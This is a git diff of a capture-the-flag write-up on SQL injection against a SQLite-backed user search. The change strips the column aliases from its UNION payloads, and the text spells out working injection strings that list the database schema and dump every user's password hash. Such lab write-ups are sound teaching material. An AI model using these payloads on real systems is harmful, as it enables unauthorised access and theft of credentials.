@@ -98,12 +98,10 @@ We managed to close out the `LIKE` query, but now there's this extra `%";` at th
 ```
 This query will also list all of the users (like in the section above), but now we have a lot more control over the resulting query. Unfortunately, all of the control we have is at the end, in the `WHERE` clause. How are we going to run our own queries? `UNION` to the rescue!
 
-The `UNION` operator isn't commonly used, so don't feel bad if you've never heard of it before. Essentially, it lets you combine the results of two queries into one. The catch is both queries need to have the same column names, and we don't know what ours need to be!
-
-Thankfully, they aren't too hard to figure out. A quick glance at the column headings on the user lets us guess that `name` and `bio` are the names of the columns. We can test this by using `" UNION SELECT "one" as name, "two" as bio; --` as the search input.
+The `UNION` operator isn't commonly used, so don't feel bad if you've never heard of it before. Essentially, it lets you combine the results of two queries into one.  We can test this by using `" UNION SELECT "one", "two"; --` as the search input.
 That leads to a query that looks like
 ```sql
-... WHERE username LIKE "%" UNION SELECT "one" as name, "two" as bio; --%";
+... WHERE username LIKE "%" UNION SELECT "one", "two"; --%";
 ```
 
 ![User Search Union](user_search_union.png)  
@@ -111,9 +109,9 @@ _One pwn, Two pwn, Red pwn, Blue pwn_
 
 ## SQL Injection (Dumping Hashes)
 
-Now that we can execute arbitrary sql, let's see about getting some more information about the application's database. We know from the challenge description that it's using sqlite, and a quick google gives us a query we can use to list all the tables and their schemas (modified slightly to fit our column names):
+Now that we can execute arbitrary sql, let's see about getting some more information about the application's database. We know from the challenge description that it's using sqlite, and a quick google gives us a query we can use to list all the tables and their schemas:
 ```sql
-SELECT name, sql AS "bio" FROM sqlite_master WHERE type='table'
+SELECT name, sql FROM sqlite_master WHERE type='table'
 ```
 This query can be injected in exactly the same way as the query in the above section, and when run will output
 
@@ -129,16 +127,17 @@ CREATE TABLE users (
     bio text not null
 )
 ```
-Aha! `password_hash` looks interesting, doesn't it? Let's write a query that will dump those (notice we need to rename `username` to `name` as well):
+Aha! `password_hash` looks interesting, doesn't it? Let's write a query that will dump those:
 ```sql
-SELECT username AS name, password_hash AS bio FROM users
+SELECT username, password_hash FROM users
 ```
 Repeating the process for this query, we get the search input we need to dump every user's password hash:
 ```
-" UNION SELECT username AS name, password_hash AS bio FROM users; --
+" UNION SELECT username, password_hash FROM users; --
 ```
 
-![User Search Hashes](user_search_hashes.png)
+![User Search Hashes](user_search_hashes.png)  
+_[Hash Get!](https://themushroomkingdom.net/images/j-e/smg_star_get_jp.jpg)_
 
 |Name|Password Hash|
 |---|---|
